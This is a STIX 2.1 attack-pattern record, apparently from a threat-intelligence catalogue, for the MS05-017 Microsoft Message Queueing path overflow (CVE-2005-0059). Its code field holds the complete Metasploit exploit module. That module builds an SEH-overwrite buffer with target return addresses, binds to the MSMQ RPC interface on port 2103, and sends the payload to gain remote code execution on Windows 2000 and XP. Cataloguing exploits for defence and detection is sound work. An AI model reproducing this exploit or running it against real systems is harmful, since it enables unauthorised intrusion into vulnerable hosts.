{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bed5e958-2f34-4df3-9110-7bd302939c6f",
    "created": "2024-08-14T16:39:39.377693Z",
    "modified": "2024-08-14T16:39:39.377697Z",
    "name": "MS05-017 Microsoft Message Queueing Service Path Overflow",
    "description": " This module exploits a stack buffer overflow in the RPC interface to the Microsoft Message Queueing service. The offset to the return address changes based on the length of the system hostname, so this must be provided via the 'HNAME' option. Much thanks to snort.org and Jean-Baptiste Marchand's excellent MSRPC website.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/dcerpc/ms05_017_msmq.rb",
            "external_id": "ms05_017_msmq.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-0059"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS05-017 Microsoft Message Queueing Service Path Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in the RPC interface\n        to the Microsoft Message Queueing service. The offset to the\n        return address changes based on the length of the system\n        hostname, so this must be provided via the 'HNAME' option.\n        Much thanks to snort.org and Jean-Baptiste Marchand's\n        excellent MSRPC website.\n\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-0059'],\n          [ 'OSVDB', '15458'],\n          [ 'MSB', 'MS05-017'],\n          [ 'BID', '13112'],\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\xff\",\n          'StackAdjustment' => -3500,\n\n        },\n      'Platform'       => %w{ win },\n      'Targets'        =>\n        [\n          [\n            'Windows 2000 ALL / Windows XP SP0-SP1 (English)',\n            {\n              'Platform' => 'win',\n              'Rets'     => [ 0x004014e9, 0x01001209 ] # mqsvc.exe\n            },\n          ],\n        ],\n      'DisclosureDate' => '2005-04-12',\n      'DefaultTarget' => 0))\n\n    # Change the default port values to point at MSMQ\n    register_options(\n      [\n        Opt::RPORT(2103),\n        OptString.new('HNAME',  [ true,  \"The NetBIOS hostname of the target\" ]),\n      ])\n  end\n\n  def autofilter\n    # Common vulnerability scanning tools report port 445/139\n    # due to how they test for the vulnerability. Remap this\n    # back to 2103 for automated exploitation\n\n    rport = datastore['RPORT'].to_i\n    if ( rport == 445 or rport == 139 )\n      datastore['RPORT'] = 2103\n    end\n\n    # The NetBIOS hostname is required to exploit this bug reliably.\n    if (not datastore['HNAME'])\n      # XXX automatically determine the hostname\n      return false\n    end\n\n    true\n  end\n\n  def exploit\n\n    # MSMQ supports three forms of queue names, the two we can use are\n    # the IP address and the hostname. If we use the IP address via the\n    # TCP: format, the offset to the SEH frame will change depending on\n    # the length of the real hostname. For this reason, we force the user\n    # to supply us with the actual hostname.\n\n    # Formats: DIRECT=TCP:IPAddress\\QueueName DIRECT=OS:ComputerName\\QueueName\n\n    queue_name = \"OS:#{datastore['HNAME']}\";\n    queue_hlen = datastore['HNAME'].length * 2\n    queue_path = unicode(queue_name + \"\\\\PRIVATE$\\\\\")\n\n    buf   = rand_text_english(4000, payload_badchars)\n\n    # Windows 2000 SEH offset goes first\n    buf[372 - queue_hlen + 0, 4] = [ target['Rets'][0] ].pack('V')\n    buf[372 - queue_hlen - 4, 2] = \"\\xeb\\x22\"\n\n    # Windows XP SEH offset goes second\n    seh = generate_seh_payload(target['Rets'][1])\n    buf[400 - queue_hlen - 4, seh.length] = seh\n\n    # Append the path to the location and null terminate it\n    queue_path << buf << \"\\x00\\x00\"\n\n    # Get the unicode length of this string\n    queue_plen = queue_path.length / 2\n\n    connect\n    print_status(\"Trying target #{target.name}...\")\n\n    handle = dcerpc_handle('fdb3a030-065f-11d1-bb9b-00a024ea5525', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])\n    print_status(\"Binding to #{handle} ...\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    stubdata =\n      NDR.long(1) +\n      NDR.long(1) +\n      NDR.long(1) +\n      NDR.long(3) +\n      NDR.long(3) +\n      NDR.long(2) +\n      NDR.UnicodeConformantVaryingStringPreBuilt(queue_path)\n\n    print_status('Sending exploit ...')\n\n    response = dcerpc.call(9, stubdata)\n\n    if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)\n      case dcerpc.last_response.stub_data\n        when \"\\x20\\x00\\x0e\\xc0\"\n          print_status(\"The server rejected our request, the HNAME parameter could be incorrect\")\n        when \"\\x1e\\x00\\x0e\\xc0\"\n          print_status(\"The server does not appear to be exploitable\")\n        else\n          print_status(\"An unknown response was received from the server:\")\n          print_status(\">> \" + dcerpc.last_response.stub_data.unpack(\"H*\")[0])\n      end\n    end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-04-12",
    "x_mitre_platforms": [
        "win'"
    ]
}